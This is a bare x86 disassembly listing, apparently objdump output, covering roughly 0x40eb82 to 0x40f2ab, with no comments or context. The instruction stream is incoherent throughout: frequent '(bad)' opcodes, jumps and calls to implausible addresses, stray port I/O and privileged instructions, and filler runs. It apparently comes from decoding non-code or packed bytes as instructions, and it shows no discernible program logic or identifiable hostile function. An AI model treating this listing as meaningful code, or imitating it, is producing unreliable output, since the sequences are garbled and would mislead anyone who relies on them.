  40eb82:	inc    ecx
  40eb83:	xor    dh,dh
  40eb85:	cmc    
  40eb86:	jmp    0x40ebf4
  40eb88:	jg     0x40eb81
  40eb8a:	cmp    DWORD PTR [ebx],edi
  40eb8c:	push   ebp
  40eb8d:	imul   esi,esi,0xc9bdf266
  40eb93:	fnstenv [ebx]
  40eb95:	or     al,0xd0
  40eb97:	push   ds
  40eb98:	lea    ecx,[eax]
  40eb9a:	adc    BYTE PTR [ebp-0x2f168311],0xc8
  40eba1:	jb     0x40eba6
  40eba3:	lahf   
  40eba4:	(bad)  
  40eba5:	jmp    DWORD PTR [edi-0x8ffcce2]
  40ebab:	pop    edx
  40ebac:	mov    BYTE PTR ds:0x25864f5e,dh
  40ebb2:	add    dh,dh
  40ebb4:	push   es
  40ebb5:	pop    eax
  40ebb6:	ret    
  40ebb7:	loope  0x40eb46
  40ebb9:	jmp    0x8909:0x68933d51
  40ebc0:	popa   
  40ebc1:	neg    BYTE PTR [eax-0x4c]
  40ebc4:	rcr    DWORD PTR [esi-0x3a7823ff],0x50
  40ebcb:	mov    ebx,0xeae80638
  40ebd0:	xchg   ecx,eax
  40ebd1:	(bad)  
  40ebd2:	jmp    DWORD PTR [ecx-0x3a]
  40ebd5:	jae    0x40ebde
  40ebd7:	add    BYTE PTR [eax],al
  40ebd9:	add    BYTE PTR [eax],al
  40ebdb:	add    BYTE PTR [ebx+edi*4-0x3],al
  40ebdf:	add    ah,cl
  40ebe1:	out    0x21,eax
  40ebe3:	push   0xffffffc6
  40ebe5:	jno    0x40ec62
  40ebe7:	clc    
  40ebe8:	jne    0x40ebfb
  40ebea:	ins    BYTE PTR es:[edi],dx
  40ebeb:	mov    edx,0x8b0269d5
  40ebf0:	mov    edx,0x6d745ef8
  40ebf5:	jno    0x40eb87
  40ebf7:	stos   DWORD PTR es:[edi],eax
  40ebf8:	jne    0x40ec63
  40ebfa:	xchg   DWORD PTR [edi-0x2659c00],edi
  40ec00:	sub    BYTE PTR [eax+0x2],0xeb
  40ec04:	ja     0x40ebfe
  40ec06:	inc    ebx
  40ec07:	pop    esi
  40ec08:	cmp    al,0x2e
  40ec0a:	or     BYTE PTR [eax],al
  40ec0c:	shl    ah,0x6f
  40ec0f:	imul   ebx,DWORD PTR [edi+0x5a530235],0xb515c22f
  40ec19:	imul   ecx,DWORD PTR [ecx+0x47ec7954],0xb
  40ec20:	iret   
  40ec21:	cmp    eax,0x9a714a8f
  40ec26:	push   0xffffffdb
  40ec28:	(bad)  [ebx+0x2]
  40ec2b:	test   DWORD PTR ds:0x4784f074,esi
  40ec31:	xlat   BYTE PTR ds:[ebx]
  40ec32:	pop    es
  40ec33:	mov    edx,0xffc2dcd5
  40ec38:	add    DWORD PTR [edi+0x21d500e],esp
  40ec3e:	lods   al,BYTE PTR ds:[esi]
  40ec3f:	inc    DWORD PTR [eax]
  40ec41:	add    BYTE PTR [eax],al
  40ec43:	add    BYTE PTR [eax],al
  40ec45:	add    ah,bh
  40ec47:	push   esp
  40ec48:	jae    0x40ecb0
  40ec4a:	jmp    0x40ec68
  40ec4c:	sub    ch,BYTE PTR [eax+0x61]
  40ec4f:	cmp    BYTE PTR [ebp+0x74],0x6b
  40ec53:	xlat   BYTE PTR ds:[ebx]
  40ec54:	pop    es
  40ec55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec56:	stos   DWORD PTR es:[edi],eax
  40ec57:	in     al,0x88
  40ec59:	ss push ecx
  40ec5b:	imul   edi,DWORD PTR [ecx],0x85162d00
  40ec61:	ret    
  40ec62:	ucomiss xmm1,DWORD PTR [edx+0x4c6d0273]
  40ec69:	inc    esi
  40ec6a:	sub    ch,BYTE PTR [ecx+0x5c]
  40ec6d:	(bad)  
  40ec6e:	iret   
  40ec6f:	dec    BYTE PTR [ecx+0x5c690338]
  40ec75:	sub    cl,dh
  40ec77:	jmp    0x40ebfc
  40ec79:	popf   
  40ec7a:	mov    edx,0x48fe0cf3
  40ec7f:	cmp    BYTE PTR [eax+0x72],0x2
  40ec83:	jmp    0x71f250f2
  40ec88:	pop    ebx
  40ec89:	out    dx,eax
  40ec8a:	xor    BYTE PTR [eax+0x23],dl
  40ec8d:	jl     0x40ec91
  40ec8f:	jmp    0x1a404c52
  40ec94:	dec    ebp
  40ec95:	fmul   DWORD PTR [ebx+0xab18af0]
  40ec9b:	fs inc ebx
  40ec9d:	(bad)  
  40ec9e:	or     DWORD PTR [ecx+0x1b],ebp
  40eca1:	lahf   
  40eca2:	iret   
  40eca3:	loop   0x40ec28
  40eca5:	retf   0xe903
  40eca8:	fadd   DWORD PTR [eax]
  40ecaa:	add    BYTE PTR [eax],al
  40ecac:	add    BYTE PTR [eax],al
  40ecae:	jbe    0x40ecc5
  40ecb0:	sub    DWORD PTR [edx+0x78],ebp
  40ecb3:	mov    dl,0x0
  40ecb5:	push   cs
  40ecb6:	sub    bl,BYTE PTR [ecx+0xd]
  40ecb9:	in     eax,0xed
  40ecbb:	(bad)  
  40ecbc:	rol    al,0x34
  40ecbf:	or     ch,cl
  40ecc1:	mov    eax,0x676965ff
  40ecc6:	add    al,BYTE PTR [ebx+0x27686fc]
  40eccc:	jmp    0xf0f7dc81
  40ecd1:	mov    BYTE PTR [edi+0x9],dh
  40ecd4:	sahf   
  40ecd5:	int3   
  40ecd6:	ds mov al,0x69
  40ecd9:	dec    esi
  40ecda:	jecxz  0x40ec77
  40ecdc:	lds    ebx,FWORD PTR [ebp-0x26]
  40ecdf:	pop    eax
  40ece0:	adc    eax,0x1e468b
  40ece5:	(bad)  
  40ece7:	aam    0x23
  40ece9:	(bad)  
  40eceb:	sbb    ecx,edx
  40eced:	sbb    eax,0xe265cab2
  40ecf2:	cmp    al,0xd5
  40ecf4:	add    esi,DWORD PTR ds:[edi-0x45]
  40ecf8:	gs pusha 
  40ecfa:	lds    esp,FWORD PTR [eax+ebx*1]
  40ecfd:	test   BYTE PTR [eax],0xc1
  40ed00:	dec    esp
  40ed01:	pop    es
  40ed02:	cld    
  40ed03:	sbb    BYTE PTR [edi+ecx*1+0x36],cl
  40ed07:	cmp    DWORD PTR [edi],eax
  40ed09:	pop    es
  40ed0a:	ins    BYTE PTR es:[edi],dx
  40ed0b:	dec    edx
  40ed0c:	mov    ebp,fs
  40ed0e:	push   edx
  40ed0f:	cli    
  40ed10:	gs jo  0x40ed13
  40ed13:	add    BYTE PTR [eax],al
  40ed15:	add    BYTE PTR [eax],al
  40ed17:	inc    ebp
  40ed18:	and    al,0x1a
  40ed1a:	cs cmp eax,0x76ce1c24
  40ed20:	add    al,BYTE PTR [ecx]
  40ed22:	push   ecx
  40ed23:	jae    0x40ed2b
  40ed25:	add    ecx,ebp
  40ed27:	inc    ebx
  40ed29:	and    ebx,ebp
  40ed2b:	ins    DWORD PTR es:[edi],dx
  40ed2c:	inc    eax
  40ed2d:	push   cs
  40ed2e:	gs xor al,0x2
  40ed31:	add    cl,ch
  40ed33:	push   es
  40ed34:	pusha  
  40ed35:	ds or  eax,edx
  40ed38:	pop    eax
  40ed39:	mov    ch,dl
  40ed3b:	sti    
  40ed3c:	mov    edi,0x17ed8717
  40ed41:	dec    edx
  40ed42:	cwde   
  40ed43:	mov    ds,WORD PTR ds:0x8976e80c
  40ed49:	inc    ebx
  40ed4a:	int    0x6
  40ed4c:	sbb    eax,0x21fadec6
  40ed51:	add    ch,cl
  40ed53:	jbe    0x40ed07
  40ed55:	out    0xff,eax
  40ed57:	push   esi
  40ed58:	pop    eax
  40ed59:	(bad)  
  40ed5a:	(bad)  
  40ed5b:	ret    0x1023
  40ed5e:	shl    DWORD PTR [ebp-0x4cff01c8],0x8a
  40ed65:	add    esi,esi
  40ed67:	fadd   QWORD PTR [esp+esi*2]
  40ed6a:	add    eax,0xeb02c35f
  40ed6f:	into   
  40ed70:	repnz mov edi,0x510a878d
  40ed76:	push   eax
  40ed77:	adc    esi,DWORD PTR [eax]
  40ed79:	and    bl,BYTE PTR [eax]
  40ed7b:	add    BYTE PTR [eax],al
  40ed7d:	add    BYTE PTR [eax],al
  40ed7f:	add    BYTE PTR [edx+eax*1+0x6a],cl
  40ed83:	add    al,0x52
  40ed85:	out    0x89,al
  40ed87:	xchg   ebx,eax
  40ed88:	lea    eax,[ebx]
  40ed8a:	test   al,al
  40ed8c:	mov    ds:0x9c01e87f,eax
  40ed91:	add    ecx,DWORD PTR [ebx+0x3e6ea303]
  40ed97:	dec    esp
  40ed98:	popa   
  40ed99:	mov    eax,0x2f5c00fd
  40ed9e:	push   esi
  40ed9f:	dec    eax
  40eda0:	dec    eax
  40eda1:	push   ecx
  40eda2:	std    
  40eda3:	je     0x40ee1d
  40eda5:	pop    edx
  40eda6:	mov    DWORD PTR [eax+ebp*2+0x5a],ebx
  40edaa:	out    0xdf,al
  40edac:	pusha  
  40edad:	add    al,0x0
  40edaf:	jmp    0x40f24d
  40edb4:	xlat   BYTE PTR ds:[ebx]
  40edb5:	das    
  40edb6:	and    dl,BYTE PTR [eax]
  40edb8:	out    0x2,al
  40edba:	push   0x1
  40edbc:	mov    eax,ds:0xec17223f
  40edc1:	mov    esp,edi
  40edc3:	call   0x41f78b
  40edc8:	mov    bl,al
  40edca:	jb     0x40ede8
  40edcc:	pushf  
  40edcd:	aaa    
  40edce:	and    cl,BYTE PTR [edi]
  40edd0:	sbb    DWORD PTR [eax],esi
  40edd2:	push   es
  40edd3:	push   esi
  40edd4:	je     0x40edce
  40edd6:	mov    ecx,0xbe80c01
  40eddb:	adc    BYTE PTR [eax+0x22],0xf
  40eddf:	add    al,0x75
  40ede1:	mov    dh,0x1
  40ede3:	push   esi
  40ede4:	add    BYTE PTR [eax],al
  40ede6:	add    BYTE PTR [eax],al
  40ede8:	add    ch,cl
  40edea:	loop   0x40ee32
  40edec:	add    BYTE PTR [ebp+0x31],dh
  40edef:	retf   
  40edf0:	or     eax,0x4b856974
  40edf5:	xchg   ecx,eax
  40edf6:	cmp    DWORD PTR [ecx-0x18],ebx
  40edf9:	clc    
  40edfa:	imul   eax,DWORD PTR [edx],0x596a4f00
  40ee00:	adc    al,0x19
  40ee02:	pop    ebx
  40ee03:	ret    0x3aff
  40ee06:	jo     0x40edf8
  40ee08:	pop    edi
  40ee09:	xchg   DWORD PTR [ecx],ebp
  40ee0b:	add    al,0x6a
  40ee0d:	jne    0x40eddd
  40ee0f:	jg     0x40ee34
  40ee11:	jmp    0x2540f07e
  40ee16:	add    DWORD PTR [ecx+0x6a424a48],ecx
  40ee1c:	sbb    ah,bl
  40ee1e:	push   0xfff98d02
  40ee23:	jae    0x40ee24
  40ee25:	push   0x6c
  40ee27:	mov    dl,0xe7
  40ee29:	bound  ecx,QWORD PTR [ebx+0x2bf10003]
  40ee2f:	or     eax,DWORD PTR [eax+eax*8-0x20fffd96]
  40ee36:	push   0xffffff87
  40ee38:	fwait
  40ee39:	cdq    
  40ee3a:	daa    
  40ee3b:	add    al,0x0
  40ee3d:	jne    0x40ee32
  40ee3f:	ficomp WORD PTR [ebx]
  40ee41:	jne    0x40eeae
  40ee43:	jle    0x40ee04
  40ee45:	jp     0x40ee2e
  40ee47:	and    DWORD PTR [ecx],eax
  40ee49:	jne    0x40eeb6
  40ee4b:	pop    ecx
  40ee4c:	adc    al,0x0
  40ee4e:	add    BYTE PTR [eax],al
  40ee50:	add    BYTE PTR [eax],al
  40ee52:	imul   esi,DWORD PTR [esi],0x2bf9ffc2
  40ee58:	or     edx,DWORD PTR [ebp+0x330947b1]
  40ee5e:	push   ds
  40ee5f:	xchg   esp,eax
  40ee60:	mov    dh,0x23
  40ee62:	push   0x2
  40ee64:	test   BYTE PTR [eax+0x3e9030d],0x5f
  40ee6b:	into   
  40ee6c:	arpl   di,cx
  40ee6e:	xchg   esi,eax
  40ee6f:	xor    DWORD PTR es:[ecx+ebp*8+0x74],ebp
  40ee74:	out    0x3,eax
  40ee76:	add    BYTE PTR [edi+0x4],bh
  40ee79:	mov    WORD PTR [edx+eax*1-0x17],?
  40ee7d:	mov    bl,0x4c
  40ee7f:	inc    al
  40ee81:	das    
  40ee82:	sti    
  40ee83:	push   ebp
  40ee84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee85:	jg     0x40ee79
  40ee87:	into   
  40ee88:	and    cl,BYTE PTR [edi+0x7f63b2b0]
  40ee8e:	push   esi
  40ee8f:	xchg   dl,ch
  40ee91:	add    esi,DWORD PTR [ebp-0x4e]
  40ee94:	sbb    BYTE PTR [edi+edx*4+0x42],ch
  40ee98:	jge    0x40eef4
  40ee9a:	icebp  
  40ee9b:	inc    edx
  40ee9c:	cld    
  40ee9d:	loopne 0x40eeab
  40ee9f:	mov    esi,0xbee9b20e
  40eea4:	or     al,0xc8
  40eea6:	(bad)  
  40eea7:	mov    dl,0x5d
  40eea9:	lock stos BYTE PTR es:[edi],al
  40eeab:	in     al,dx
  40eeac:	test   al,0x3
  40eeae:	idiv   BYTE PTR ds:0x1df688dc
  40eeb4:	pop    ecx
  40eeb5:	add    eax,DWORD PTR [eax]
  40eeb7:	add    BYTE PTR [eax],al
  40eeb9:	add    BYTE PTR [eax],al
  40eebb:	jne    0x40eebf
  40eebd:	jo     0x40ee7e
  40eebf:	xchg   esi,eax
  40eec0:	mov    dl,0x63
  40eec2:	mov    edi,0x8898fa96
  40eec7:	mov    dh,0x1e
  40eec9:	mov    ch,0xb3
  40eecb:	(bad)  
  40eecc:	mov    cl,0x6b
  40eece:	jg     0x40ef26
  40eed0:	jp     0x40eebc
  40eed2:	add    esi,DWORD PTR [ebp-0x4e]
  40eed5:	pop    edi
  40eed6:	iret   
  40eed7:	push   esi
  40eed8:	mov    dh,0x10
  40eeda:	mov    cl,0xc
  40eedc:	add    ch,cl
  40eede:	or     dl,0xcd
  40eee1:	dec    esi
  40eee3:	push   cs
  40eee4:	jge    0x40eef8
  40eee6:	jmp    0xdb44461
  40eeeb:	in     eax,dx
  40eeec:	push   ebx
  40eeed:	adc    al,0x9
  40eeef:	loopne 0x40ef05
  40eef1:	add    dh,dl
  40eef3:	lds    esp,FWORD PTR [eax]
  40eef5:	sbb    al,0x62
  40eef7:	push   0x6
  40eef9:	adc    ebp,DWORD PTR [ecx]
  40eefb:	jns    0x40ef52
  40eefd:	aad    0xbe
  40eeff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef00:	and    BYTE PTR [eax],bl
  40ef02:	mov    dh,0x87
  40ef04:	aas    
  40ef05:	inc    ebx
  40ef06:	add    eax,0x3a53036c
  40ef0b:	call   0x7739f1ec
  40ef10:	add    bh,bh
  40ef12:	cld    
  40ef13:	outs   dx,BYTE PTR ds:[esi]
  40ef14:	out    dx,al
  40ef15:	aas    
  40ef16:	jmp    0xf664c811
  40ef1b:	ja     0x40eeec
  40ef1d:	pop    esi
  40ef1e:	jle    0x40ef20
  40ef20:	add    BYTE PTR [eax],al
  40ef22:	add    BYTE PTR [eax],al
  40ef24:	in     eax,0x20
  40ef26:	pop    eax
  40ef27:	jmp    0x40ef9f
  40ef29:	add    cl,BYTE PTR [ebp-0xa9aa9b]
  40ef2f:	call   0x5f442aa
  40ef34:	int    0x53
  40ef36:	(bad)  
  40ef37:	jmp    0x1964af2b
  40ef3c:	repnz mov edi,0x5506f923
  40ef42:	jae    0x40ef49
  40ef44:	dec    ebp
  40ef45:	cmp    eax,0xd35d0d43
  40ef4a:	cld    
  40ef4b:	test   eax,0xcd433b76
  40ef50:	ss imul ebp,esi,0xffffffa8
  40ef54:	jbe    0x40ef91
  40ef56:	inc    ebx
  40ef57:	int    0xe2
  40ef59:	cmp    esp,0x433b76a9
  40ef5f:	add    BYTE PTR [eax+0x48],al
  40ef62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef63:	std    
  40ef64:	fdiv   st(7),st
  40ef66:	mov    BYTE PTR [eax+esi*1+0x3c],0xeb
  40ef6b:	std    
  40ef6c:	int3   
  40ef6d:	inc    esi
  40ef6f:	inc    esp
  40ef70:	or     BYTE PTR [esi-0x16301e0],0xc6
  40ef77:	inc    esp
  40ef78:	jo     0x40ef0c
  40ef7a:	jge    0x40ef79
  40ef7c:	mov    esi,?
  40ef7e:	out    0xc3,eax
  40ef80:	sub    edi,edi
  40ef82:	jmp    FWORD PTR [ecx-0x23]
  40ef85:	jl     0x40ef09
  40ef87:	and    al,0x0
  40ef89:	add    BYTE PTR [eax],al
  40ef8b:	add    BYTE PTR [eax],al
  40ef8d:	or     BYTE PTR [eax],al
  40ef8f:	add    BYTE PTR [eax],al
  40ef91:	mov    ah,0x72
  40ef93:	sbb    eax,DWORD PTR [eax]
  40ef95:	pushf  
  40ef96:	xchg   BYTE PTR [ebx+0x8],bl
  40ef99:	daa    
  40ef9a:	inc    ebx
  40ef9b:	and    dl,BYTE PTR [eax]
  40ef9d:	hlt    
  40ef9e:	outs   dx,DWORD PTR ds:[esi]
  40ef9f:	or     al,BYTE PTR [ecx]
  40efa1:	mov    WORD PTR [esi-0x184fdb8e],es
  40efa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efa8:	or     al,0x9d
  40efaa:	call   DWORD PTR [edx-0x18]
  40efad:	pop    esi
  40efae:	imul   edi,ebp,0xffffffff
  40efb1:	imul   ebx,DWORD PTR [eax-0x79c83fcf],0xffffffe3
  40efb8:	pop    ebp
  40efb9:	sahf   
  40efba:	push   ebx
  40efbb:	(bad)  
  40efbc:	push   esp
  40efbd:	xlat   BYTE PTR ds:[ebx]
  40efbe:	fstp   TBYTE PTR [edi-0x14]
  40efc1:	test   ah,bh
  40efc3:	(bad)  
  40efc4:	(bad)  
  40efc5:	out    dx,eax
  40efc6:	nop
  40efc7:	mov    esi,DWORD PTR [ebp-0xc]
  40efca:	out    0xa1,al
  40efcc:	mov    bh,0x8b
  40efce:	mov    edx,0x61545d89
  40efd3:	cmp    DWORD PTR [ebx-0x18],0x8b45c5fe
  40efda:	dec    DWORD PTR [esi]
  40efdc:	test   BYTE PTR [ebp-0x25],dh
  40efdf:	add    DWORD PTR [eax],eax
  40efe1:	jne    0x40ef99
  40efe3:	ret    
  40efe4:	pop    ss
  40efe5:	cld    
  40efe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efe7:	push   0x56
  40efe9:	or     cl,dh
  40efeb:	push   0x65
  40efed:	out    dx,al
  40efee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efef:	int3   
  40eff0:	out    0x0,eax
  40eff2:	add    BYTE PTR [eax],al
  40eff4:	add    BYTE PTR [eax],al
  40eff6:	fsub   DWORD PTR [ecx+0x1]
  40eff9:	add    dh,bh
  40effb:	pusha  
  40effc:	mov    WORD PTR [ebp+ebp*8-0x19],?
  40f000:	push   esi
  40f001:	(bad)  
  40f002:	push   0x74024e05
  40f007:	xor    al,0x7e
  40f009:	data16 je 0x40f075
  40f00c:	add    ch,BYTE PTR [eax-0x3]
  40f00f:	aaa    
  40f010:	add    al,BYTE PTR [eax]
  40f012:	ret    0xe55
  40f015:	aam    0x36
  40f017:	imul   edx,DWORD PTR [ebp+0x14],0xffc25855
  40f01e:	imul   esp,DWORD PTR [edi+0x3],0xc4827500
  40f025:	add    BYTE PTR [ebp+0x69],dh
  40f028:	lods   eax,DWORD PTR ds:[esi]
  40f029:	out    0x6,eax
  40f02b:	sahf   
  40f02c:	push   esi
  40f02d:	(bad)  
  40f02e:	and    dh,BYTE PTR [ecx+0x2a]
  40f031:	fld    QWORD PTR [edx-0x524b7735]
  40f037:	in     eax,0x56
  40f039:	(bad)  
  40f03a:	pop    ebp
  40f03b:	(bad)  
  40f03d:	jmp    FWORD PTR [edx-0x21]
  40f040:	or     bl,0x60
  40f043:	mov    ecx,0x36e84f56
  40f048:	cmp    BYTE PTR ss:0x24536bc9,0x11
  40f050:	push   edi
  40f051:	xchg   DWORD PTR [eax-0x3e407fe7],edi
  40f057:	add    eax,0x28b
  40f05c:	add    BYTE PTR [eax],al
  40f05e:	add    BYTE PTR [edx],dh
  40f060:	add    ebx,DWORD PTR [edi+esi*1+0x2004d7ff]
  40f067:	je     0x40f06a
  40f069:	pop    edi
  40f06a:	inc    esp
  40f06b:	and    ebp,DWORD PTR [ebx]
  40f06d:	icebp  
  40f06e:	inc    ebx
  40f06f:	add    DWORD PTR [esi-0x4ccbdd14],edi
  40f075:	xchg   ebp,eax
  40f076:	xchg   ebx,eax
  40f077:	jne    0x40f0d3
  40f079:	daa    
  40f07a:	je     0x40f0f1
  40f07c:	add    bl,BYTE PTR [ecx+edx*8-0x32]
  40f080:	jp     0x40f0ad
  40f082:	push   esi
  40f083:	shl    ch,cl
  40f085:	mov    bh,0x56
  40f087:	jecxz  0x40f014
  40f089:	mov    BYTE PTR [esi*2-0x457fa3fe],0x4f
  40f091:	lds    edx,FWORD PTR [esi-0x50]
  40f094:	add    ch,cl
  40f096:	ret    
  40f097:	sub    eax,0x281bafd7
  40f09c:	push   eax
  40f09d:	fnstsw WORD PTR [edi-0xe]
  40f0a0:	add    ch,cl
  40f0a2:	add    ebx,DWORD PTR [edi]
  40f0a4:	add    dl,BYTE PTR [ebx]
  40f0a6:	add    al,0xf0
  40f0a8:	(bad)  
  40f0a9:	nop
  40f0aa:	mov    bl,0x67
  40f0ac:	inc    edx
  40f0ad:	sbb    BYTE PTR [esp+edi*2+0x301ae903],0x4a
  40f0b5:	in     eax,dx
  40f0b6:	sbb    dl,0x2
  40f0b9:	jmp    0x7110dec1
  40f0be:	jmp    0x40f062
  40f0c0:	xlat   BYTE PTR ds:[ebx]
  40f0c1:	call   0x40f0c9
  40f0c6:	add    BYTE PTR [eax],al
  40f0c8:	fild   WORD PTR [edi]
  40f0ca:	ins    BYTE PTR es:[edi],dx
  40f0cb:	rcl    BYTE PTR [edx-0x4e],0x40
  40f0cf:	xchg   ecx,eax
  40f0d0:	jae    0x40f0d5
  40f0d2:	jmp    0xe0170356
  40f0d7:	(bad)  
  40f0d9:	into   
  40f0da:	cmp    BYTE PTR [eax],al
  40f0dc:	enter  0xfff4,0xe5
  40f0e0:	jmp    0x40f0a7
  40f0e2:	icebp  
  40f0e3:	xchg   esi,eax
  40f0e4:	std    
  40f0e5:	lods   eax,DWORD PTR ds:[esi]
  40f0e6:	jmp    0x40f0f9
  40f0e8:	xchg   ebx,eax
  40f0e9:	add    BYTE PTR [eax],0xe9
  40f0ec:	out    dx,eax
  40f0ed:	lods   eax,DWORD PTR ds:[esi]
  40f0ee:	pop    es
  40f0ef:	add    dh,BYTE PTR [esp+edx*1-0x40]
  40f0f3:	gs mov dh,0xd5
  40f0f6:	jno    0x40f0ee
  40f0f8:	clc    
  40f0f9:	(bad)
  40f0fc:	cs aad 0x9
  40f0ff:	mov    eax,ds:0x2753d62e
  40f104:	mov    ch,0x4f
  40f106:	add    dl,dl
  40f108:	mov    bl,0xe6
  40f10a:	sbb    BYTE PTR [edi+eax*2+0x5],0x75
  40f10f:	repnz lds esi,FWORD PTR cs:[edi-0x1691b3f]
  40f117:	(bad)  
  40f118:	(bad)  
  40f11a:	imul   esi,ecx,0xa3f01629
  40f120:	mov    ah,0x50
  40f122:	std    
  40f123:	aam    0x62
  40f125:	repz aas 
  40f127:	jmp    0x97c55229
  40f12c:	add    BYTE PTR [eax],al
  40f12e:	add    BYTE PTR [eax],al
  40f130:	add    ch,al
  40f132:	sbb    DWORD PTR [ebx-0x24f2d4],ecx
  40f138:	ss (bad) 
  40f13a:	out    dx,al
  40f13b:	mov    ch,cl
  40f13d:	sahf   
  40f13e:	std    
  40f13f:	fisubr DWORD PTR [ecx]
  40f141:	jns    0x40f11d
  40f143:	(bad)  
  40f144:	call   0xeccdf3bd
  40f149:	push   cs
  40f14a:	jnp    0x40f191
  40f14c:	in     eax,dx
  40f14d:	fimul  WORD PTR [ecx-0x4b]
  40f150:	pop    esi
  40f151:	enter  0xbf83,0xdc
  40f155:	pop    eax
  40f156:	mov    dh,0xe7
  40f158:	(bad)  
  40f159:	in     al,dx
  40f15a:	push   eax
  40f15b:	inc    BYTE PTR [eax]
  40f15d:	mov    bl,0x3f
  40f15f:	jmp    0xccff:0xfd69cae8
  40f166:	aaa    
  40f167:	std    
  40f168:	add    BYTE PTR [ebx-0x30],dl
  40f16b:	notrack call DWORD PTR [ebx-0x4b]
  40f16f:	mov    DWORD PTR [ebp+0x54],esi
  40f172:	fdivrp st(1),st
  40f174:	or     cl,BYTE PTR ds:0x837d8004
  40f17a:	push   es
  40f17b:	jne    0x40f186
  40f17d:	or     al,BYTE PTR [ebx]
  40f17f:	add    DWORD PTR [edi],ecx
  40f181:	cdq    
  40f182:	sub    al,0xfc
  40f184:	inc    DWORD PTR [ebx]
  40f186:	xchg   edi,eax
  40f187:	mov    esi,DWORD PTR [ebp-0x5c]
  40f18a:	fidivr WORD PTR [edx-0x49]
  40f18d:	shl    DWORD PTR [esi-0x21638c03],cl
  40f193:	fwait
  40f194:	les    eax,FWORD PTR [eax]
  40f196:	add    BYTE PTR [eax],al
  40f198:	add    BYTE PTR [eax],al
  40f19a:	ret    
  40f19b:	mov    dh,0x51
  40f19d:	call   0x3e5ae4
  40f1a2:	inc    edi
  40f1a3:	or     eax,0xb649fde7
  40f1a8:	std    
  40f1a9:	pop    esi
  40f1aa:	mov    edi,0xdec959c3
  40f1af:	dec    edi
  40f1b0:	(bad)  
  40f1b1:	push   esp
  40f1b2:	daa    
  40f1b3:	out    0x81,eax
  40f1b5:	in     al,dx
  40f1b6:	mov    BYTE PTR [ecx-0x689a8ac],dl
  40f1bc:	mov    WORD PTR [ebp-0x10],?
  40f1bf:	mov    esp,esi
  40f1c1:	ins    BYTE PTR es:[edi],dx
  40f1c2:	pop    ss
  40f1c3:	add    al,0x0
  40f1c5:	mov    ecx,DWORD PTR [ecx+0x6582fb]
  40f1cb:	add    esi,esi
  40f1cd:	push   es
  40f1ce:	pop    ebp
  40f1cf:	pop    ecx
  40f1d0:	add    BYTE PTR [ebx+0x48],bl
  40f1d3:	push   ebx
  40f1d4:	push   0x28dd110
  40f1d9:	push   eax
  40f1da:	jne    0x40f1c2
  40f1dc:	aad    0xfb
  40f1de:	(bad)  
  40f1df:	sbb    ebp,DWORD PTR [ebx-0x2b]
  40f1e2:	cmp    eax,0xc38d025a
  40f1e7:	popa   
  40f1e8:	stos   DWORD PTR es:[edi],eax
  40f1e9:	(bad)  
  40f1ea:	pusha  
  40f1eb:	(bad)
  40f1ee:	jne    0x40f259
  40f1f0:	stos   DWORD PTR es:[edi],eax
  40f1f1:	mov    WORD PTR [eax+0xdc287ed],gs
  40f1f7:	sbb    DWORD PTR [ebx+0x0],ecx
  40f1fa:	jne    0x40f188
  40f1fc:	test   DWORD PTR [ebp+0x0],eax
  40f1ff:	add    BYTE PTR [eax],al
  40f201:	add    BYTE PTR [eax],al
  40f203:	mov    edi,0xd7c8589
  40f208:	aam    0x3f
  40f20a:	out    0xc4,eax
  40f20c:	adc    BYTE PTR [edx],al
  40f20e:	add    dl,bh
  40f210:	int    0x5a
  40f212:	mov    WORD PTR [eax],?
  40f214:	in     eax,dx
  40f215:	push   ebx
  40f216:	je     0x40f1f9
  40f218:	aad    0xd0
  40f21a:	mov    esp,edx
  40f21c:	mov    ch,0x4f
  40f21e:	dec    edi
  40f21f:	dec    edi
  40f220:	stc    
  40f221:	scas   al,BYTE PTR es:[edi]
  40f222:	out    0x28,eax
  40f224:	outs   dx,DWORD PTR ds:[esi]
  40f225:	push   edx
  40f226:	(bad)  
  40f227:	neg    BYTE PTR [ebx+esi*8+0x12fbd82]
  40f22e:	test   DWORD PTR [ebx],eax
  40f230:	pop    ecx
  40f231:	add    al,BYTE PTR [eax]
  40f233:	(bad)  
  40f234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f235:	mov    bl,0x69
  40f237:	je     0x40f22a
  40f239:	jae    0x40f207
  40f23b:	ss pop ecx
  40f23d:	push   ecx
  40f23e:	adc    al,0xd1
  40f240:	dec    edx
  40f241:	ret    0xfdff
  40f244:	and    eax,0x57b584fc
  40f249:	xchg   BYTE PTR [edx-0xfda68b],bl
  40f24f:	pusha  
  40f250:	pop    ecx
  40f251:	cmc    
  40f252:	aas    
  40f253:	jne    0x40f1f3
  40f255:	cdq    
  40f256:	jmp    FWORD PTR [edx+0x3]
  40f259:	jmp    0xd38e6436
  40f25e:	sti    
  40f25f:	pop    ebx
  40f260:	clc    
  40f261:	in     al,0xf6
  40f263:	xchg   edx,eax
  40f264:	add    ch,BYTE PTR [edx-0x17]
  40f267:	add    BYTE PTR [eax],al
  40f269:	add    BYTE PTR [eax],al
  40f26b:	add    BYTE PTR [edx+0x2],dh
  40f26e:	push   0xffffffd1
  40f270:	jp     0x40f274
  40f272:	mov    ch,0xce
  40f274:	int3   
  40f275:	stos   BYTE PTR es:[edi],al
  40f276:	ret    0x33fb
  40f279:	sbb    BYTE PTR [ecx],bh
  40f27b:	ds mov bh,0x2
  40f27e:	es stc 
  40f280:	inc    esi
  40f281:	icebp  
  40f282:	test   al,0x3
  40f284:	out    dx,al
  40f285:	dec    edx
  40f286:	imul   edx,DWORD PTR [ebx-0x7a],0xffffffaf
  40f28a:	popa   
  40f28b:	icebp  
  40f28c:	dec    esi
  40f28d:	hlt    
  40f28e:	test   al,0x3
  40f290:	(bad)  
  40f291:	repnz imul ecx,edx,0x76
  40f295:	mov    dl,0x63
  40f297:	retf   
  40f298:	jbe    0x40f24c
  40f29a:	in     eax,dx
  40f29b:	inc    DWORD PTR ss:[ebx+edx*2]
  40f29f:	push   cs
  40f2a0:	in     al,dx
  40f2a1:	add    eax,0x7f86496a
  40f2a6:	sub    eax,0xcdb228f8
  40f2ab:	ss inc edi
